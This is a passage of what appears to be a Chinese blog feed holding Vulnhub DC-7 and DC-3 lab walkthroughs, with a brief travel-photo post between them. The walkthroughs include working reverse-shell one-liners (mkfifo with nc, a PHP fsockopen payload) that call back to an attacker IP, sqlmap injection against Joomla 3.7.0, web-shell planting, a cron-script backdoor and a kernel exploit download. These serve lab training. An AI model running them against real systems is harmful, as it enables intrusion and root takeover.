src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/ea38a3a17f8f46b8a72d8d658a158d66.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/ea38a3a17f8f46b8a72d8d658a158d66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>随后我们找到并且查看这个脚本文件，发现了脚本文件的内容。</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/8e67223aa5794d7483131ea8b4d86525.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/8e67223aa5794d7483131ea8b4d86525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>其中，文件显示作者使用了gpg对文件进行了加密，并且使用drush命令对网站进行了配置，drush命令是drupal框架的一个命令，可以更改网站的密码。该脚本是自动执行的，每隔十五分钟就运行一次。dc7user无法改变密码，但是这个脚本却可以！说明这个脚本肯定不是普通用户权限！查看了之后，发现它所属组是www-data，也就是网页的用户。那么我们可能需要去网页进行提权了。</p><p>我们使用刚刚发现的drash把密码改了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /var/www/htmldrush user-password admin --password<span class="token operator">=</span><span class="token string">"haha123"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功更改了密码！接着返回到网页进行登录尝试，成功进入了后台！</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/2eb50881ba4541c2b2a424e056ae1fe3.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/2eb50881ba4541c2b2a424e056ae1fe3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>接着找找看有无文件上传点、php注马等的东西，找到了一个位点可以写原生的页面的地方，但是似乎写入的php代码，不起作用，直接原文显示了：</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/23113c2d760242fcab0305edb93b3725.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/23113c2d760242fcab0305edb93b3725.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>后来我查阅了相关资料，发现Drupal 8 为了安全，需要安装相关的php拓展才能运行php文件，那么我们就去extension选项中安装相应的php拓展就行：</p><p>打开这个网址下载php的拓展，一定得是.tar.gz格式的，然后直接进行本地安装，发现安装成功！</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/3af59c41c24644f4abd6f3990f4ed744.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/3af59c41c24644f4abd6f3990f4ed744.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>回到extend页面，往下拉，找到php filter并且勾选启用拓展，那么此时我们再次刷新，发现php代码已经可以被解析了！此时回到原来的编辑器，把Text format改为PHP Code，然后保存刷新，成功执行，代码消失了。</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/0a2ea52541ad49aa91cebca7f8dc6098.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/0a2ea52541ad49aa91cebca7f8dc6098.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>我打开我的中国蚁剑，看看能不能连上，发现不行，网页提示出错，也不像php的报错，应该是被网站的CMS给拦截了，不给执行。提示的信息如下：”The website encountered an unexpected error. Please try again later.”。</p><p>那么既然不给使用一句话木马，那么就直接把php写成木马，尝试在网页中写入反弹shell的木马，使用nc进行监听。</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e37cd19308c54554bd94838f2acbe6da.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e37cd19308c54554bd94838f2acbe6da.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>在terminal中输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，webshell反弹成功！</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/4dd1d9d2080a4c5089a34cdf71ca9169.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/4dd1d9d2080a4c5089a34cdf71ca9169.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>接下来的思路即为提权。通过上面的分析我们发现，root用户会定期执行backups.sh脚本，而此时用户www-data存在着写权限，那么即可尝试将反弹shell的脚本写入backups.sh脚本，那么等待反弹即可获得root权限，由计划任务可知，这个脚本每过15分钟即执行一次。</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/d79b4bb303d94fd798309b24f0725285.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/d79b4bb303d94fd798309b24f0725285.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>写入反弹shell脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.0.9 7777 &gt;/tmp/f"</span> <span class="token operator">&gt;&gt;</span> /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹成功！！！！</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/b47eaa3fa5d84312a0ccc4d7c97ac749.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/b47eaa3fa5d84312a0ccc4d7c97ac749.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>最后以root的身份执行权限，到root目录下，即可拿到thekey.txt，查看即可拿到最终的答案，渗透测试结束！拿下！</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/35f7ef026bfe44d89f83f75180fd12a6.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/35f7ef026bfe44d89f83f75180fd12a6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><hr><p><em>注：在渗透过程中我还尝试了使用msf框架进行攻击，但是最后一无所获，个人建议还是提升自己的实力比较好，少用大量的脚本框架！</em></p><hr>]]></content>
      
      
      <categories>
          
          <category> DC靶场系列教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场攻略 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅浅放个假</title>
      <link href="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/"/>
      <url>/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/</url>
      
        <content type="html"><![CDATA[<h2 id="天气晴朗，微风"><a href="#天气晴朗，微风" class="headerlink" title="天气晴朗，微风"></a>天气晴朗，微风</h2><h3 id="坐标：南京紫金山"><a href="#坐标：南京紫金山" class="headerlink" title="坐标：南京紫金山"></a>坐标：南京紫金山</h3><p>上山也是有点累的，好在山顶有美丽的风景。</p><img src="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/20230331103916.jpg" class="lazyload placeholder" data-srcset="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/20230331103916.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="山顶落日"><hr><img src="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/20230331103653.jpg" class="lazyload placeholder" data-srcset="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/20230331103653.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="山顶夜景"><h3 id="坐标：南京玄武湖"><a href="#坐标：南京玄武湖" class="headerlink" title="坐标：南京玄武湖"></a>坐标：南京玄武湖</h3><p>在返回的途中，由于时间宽裕，顺便去赏了玄武湖。</p><img src="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/IMG_20230328_195708.jpg" class="lazyload placeholder" data-srcset="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/IMG_20230328_195708.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="玄武湖景1"><hr><img src="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/IMG_20230328_204901.jpg" class="lazyload placeholder" data-srcset="/2023/03/31/%E6%B5%85%E6%B5%85%E6%94%BE%E4%B8%AA%E5%81%87/IMG_20230328_204901.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="玄武湖景2">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_DC系列靶场-DC3攻略</title>
      <link href="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/"/>
      <url>/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="确定靶机ip"><a href="#确定靶机ip" class="headerlink" title="确定靶机ip"></a>确定靶机ip</h4><ul><li>使用nmap对同网段的主机进行扫描，从而确定主机的IP地址确定靶机ip。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sS <span class="token number">192.168</span>.23.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>成功发现了靶机的地址：192.168.23.141<pre class="line-numbers language-nmapNmap" data-language="nmapNmap"><div class="caption"><span>scan report for bogon (192.168.23.141)</span></div><code class="language-nmapNmap">Host is up (0.00064s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 00:0C:29:F4:78:75 (VMware)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>靶机开启了http服务，尝试访问，确认了靶机的web页面。</li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681798004955.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681798004955.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="foundweb"><h4 id="收集靶机的端口信息"><a href="#收集靶机的端口信息" class="headerlink" title="收集靶机的端口信息"></a>收集靶机的端口信息</h4><ul><li>在nmap的常用扫描中只发现了80端口，我们让它对于这个靶机进行精准探测试试看，看看能否挖掘出更多的有用信息。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sS <span class="token number">192.168</span>.23.141 -p <span class="token number">1</span>-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>显然，没有别的开放端口了。<pre class="line-numbers language-nmap" data-language="nmap"><code class="language-nmap">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 02:26 EDTNmap scan report for bogon (192.168.23.141)Host is up (0.00077s latency).Not shown: 65534 closed tcp ports (reset)PORT   STATE SERVICE80/tcp open  httpMAC Address: 00:0C:29:F4:78:75 (VMware)Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="收集靶机的页面信息"><a href="#收集靶机的页面信息" class="headerlink" title="收集靶机的页面信息"></a>收集靶机的页面信息</h4><ul><li>在主页里面有一个醒目的信息，是一个登录页面，可能存在弱口令。</li><li>主页后台是使用php语言编写的，使用了Joomla CMS框架。</li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681799030764.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681799030764.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="page_info"><h4 id="收集页面敏感目录"><a href="#收集页面敏感目录" class="headerlink" title="收集页面敏感目录"></a>收集页面敏感目录</h4><ul><li>使用dirb工具对网站进行扫描，查找是否有敏感文件泄露。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.23.141/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>发现了一些奇怪的路由–&gt;<pre class="line-numbers language-text" data-language="text"><code class="language-text">---- Scanning URL: http://192.168.23.141/ ----==&gt; DIRECTORY: http://192.168.23.141/administrator/==&gt; DIRECTORY: http://192.168.23.141/bin/==&gt; DIRECTORY: http://192.168.23.141/cache/ORY: http://192.168.23.141/components/==&gt; DIRECTORY: http://192.168.23.141/images/==&gt; DIRECTORY: http://192.168.23.141/includes/+ http://192.168.23.141/index.php (CODE:200|SIZE:7109)                                                 ==&gt; DIRECTORY: http://192.168.23.141/language/==&gt; DIRECTORY: http://192.168.23.141/layouts/==&gt; DIRECTORY: http://192.168.23.141/libraries/==&gt; DIRECTORY: http://192.168.23.141/media/==&gt; DIRECTORY: http://192.168.23.141/modules/==&gt; DIRECTORY: http://192.168.23.141/plugins/+ http://192.168.23.141/server-status (CODE:403|SIZE:302)==&gt; DIRECTORY: http://192.168.23.141/templates/==&gt; DIRECTORY: http://192.168.23.141/tmp/   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>看样子是一个后台的登录路由，访问后，疑似进入了管理页面。<img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681802485453.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681802485453.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="login"></li></ul><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="使用专用工具扫描"><a href="#使用专用工具扫描" class="headerlink" title="使用专用工具扫描"></a>使用专用工具扫描</h4><ul><li>从目前的情况来看，网站使用的是joomla框架搭建的，对于kali Linux则是自带了这个框架的扫描工具。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">joomscan --url http://192.168.23.141/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>嗯，没有发现很好的可以利用的信息，但是发现了joomla的版本号3.7.0，并且防火墙是关闭的。<pre class="line-numbers language-result" data-language="result"><code class="language-result">[+] FireWall Detector[++] Firewall not detected[+] Detecting Joomla Version[++] Joomla 3.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="百度的力量"><a href="#百度的力量" class="headerlink" title="百度的力量"></a>百度的力量</h4><ul><li>百度寻找这个框架版本，看看有什么新的发现。嗯，不错，看来有个sql注入的漏洞没有修复呢。</li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681804886092.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681804886092.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="github"><ul><li>然后我们就找到了这个漏洞的EXP，使用sqlmap一键注入：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.23.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent --dbs -p list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>然后就得到了数据库名字</li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681805280459.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681805280459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="sqlmap"><ul><li><p>同样的，我们可以直接让它帮我们寻找到更多的信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 找出joomladb数据库中表的名字</span>sqlmap -u <span class="token string">"http://192.168.23.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent -D joomladb --tables -p list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>发现表”#__users”，尝试继续获取信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap  -u <span class="token string">"http://192.168.23.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent -D <span class="token string">"joomladb"</span> -T <span class="token string">"#__users"</span> -C <span class="token string">"name,password"</span> --dump  -p list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>最终我们发现了数据库中admin用户的密码加密后的字符串。</p></li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681805837995.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681805837995.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="user"><h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><ul><li><p>我们得到了密码的md5加密之后的值，那么下一步自然就是尝试对于这个密码的破解了，我们依然使用的是kali Linux自带的工具john。</p></li><li><p>先把密码定向到一个文件mima.txt中，然后使用john。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john mima.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>得到了密码结果为：snoopy</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\root&gt; john mima.txt                    Created directory: /root/.johnUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsProceeding with single, rules:SinglePress 'q' or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lstsnoopy           (?)     1g 0:00:00:00 DONE 2/3 (2023-04-18 04:19) 1.754g/s 63.15p/s 63.15c/s 63.15C/s 123456..busterUse the "--show" option to display all of the cracked passwords reliablySession completed. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>然后我们就能成功了登录系统后台。</p><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681806256035.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681806256035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="loginsuccess} #### 利用文件上传漏洞 * 以往的经验告诉我，一般这种CMS后台都是寻找有无文件上传或者包含点来进行突破的。而很合适的就是，这个CMS就直接可以让管理员进行编辑。我们直接上传木马就好了。找到templates下面可以提供编辑的地方。 {%asset_img uTools_1681807790151.png insert"></li><li><p>然后我们就可以直接在index.php中写入一句话木马，经测试，能够触发shell。</p></li></ul> <img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681812672883.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681812672883.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="shell"><ul><li><p>然后我们直接使用php来反弹shell，在本地开启nc进行监听。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvvp <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在网站中访问。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.23.141/?haha=set_time_limit(0);%20$ip=%22192.168.23.131%22;%20$port=%222333%22;%20$fp=@fsockopen($ip,$port,$errno,$errstr);%20if(!$fp){%20echo%20%22error%22;}%20else{%20fputs($fp,%22\n++++++++++connect%20success++++++++\n%22);%20while%20(!feof($fp))%20{%20fputs($fp,%22[php-shell]:%22);%20$shell=fgets($fp);%20$message=`$shell`;%20fputs($fp,$message);%20}%20fclose($fp);%20}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>反弹成功！</p></li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681813102351.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681813102351.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="reverse_shell"><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><ul><li>由于自带的webshell不太好用，所以先尝试把shell升级一下。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh -i <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">192.168</span>.23.131 <span class="token number">1234</span> <span class="token operator">&gt;</span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681815670698.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681815670698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="updateshell"><ul><li>在反弹的shell中绕了一大圈，没发现啥的有用信息，但是通过lsb_release -a找到了ubuntu的版本是16.04，可能存在内核提权漏洞。</li></ul><img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681814791125.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/uTools_1681814791125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="upget"><ul><li>最后还是靠百度，找到了相应的POC利用。在本地开启一个服务，然后让对面的靶机去下载我们的文件。<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<span class="token function">unzip</span> <span class="token number">39772</span>.zip<span class="token builtin class-name">cd</span> <span class="token number">39772</span><span class="token function">tar</span> xvf crasher.tar<span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_crasher./compile.sh./doubleput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>然后在这边等个1——2分钟就可以成功获取到root权限了。<img src="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/1648715172561-cc70aabc-9e9c-4ab9-bb6b-0b5b1e97f40b.png" class="lazyload placeholder" data-srcset="/2023/03/18/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC3%E6%94%BB%E7%95%A5/1648715172561-cc70aabc-9e9c-4ab9-bb6b-0b5b1e97f40b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="right"></li></ul>]]></content>
      
      
      <categories>
          
          <category> DC靶场系列教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场攻略 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_DC系列靶场-DC1攻略</title>
      <link href="/2023/03/05/Vl-1/"/>
      <url>/2023/03/05/Vl-1/</url>
      
